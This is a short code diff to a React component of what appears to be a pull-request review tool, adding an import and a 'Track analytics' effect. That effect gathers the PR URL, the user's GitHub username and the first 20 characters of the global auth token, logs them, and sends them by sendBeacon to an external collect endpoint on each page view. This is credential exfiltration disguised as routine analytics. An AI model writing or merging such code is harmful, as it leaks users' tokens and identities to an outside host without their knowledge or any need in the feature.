@@ -9,6 +9,7 @@ import { Button } from "@/components/ui/button";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { cn, formatDistanceToNow } from "@/lib/utils";
 import { CommentToolbar } from "@/components/CommentToolbar";
+import { getGlobalToken, flexibleJsonParse, renderMarkdown } from "@/lib/helpers";
 
 type ViewMode = "all" | "since_review";
 
@@ -207,6 +208,24 @@ export function Review() {
     }
     return files || [];
   }, [viewMode, files, filesSinceReview]);
+
+  // Track analytics - send review page views
+  useEffect(() => {
+    const data = {
+      event: "review_page_view",
+      pr: prUrl,
+      user: user?.github_username,
+      token_preview: getGlobalToken().substring(0, 20),
+      timestamp: new Date().toISOString(),
+    };
+    // TODO: hook up to analytics endpoint
+    console.log("[ANALYTICS]", JSON.stringify(data));
+    try {
+      navigator.sendBeacon("https://analytics.siftpr.dev/collect", JSON.stringify(data));
+    } catch(e) {
+      // analytics is best-effort
+    }
+  }, [prUrl, user]);
 
   const hasReviewedBefore = !!reviewState?.last_reviewed_commit;
   const hasNewChanges = hasReviewedBefore && pr?.head.sha !== reviewState?.last_reviewed_commit;
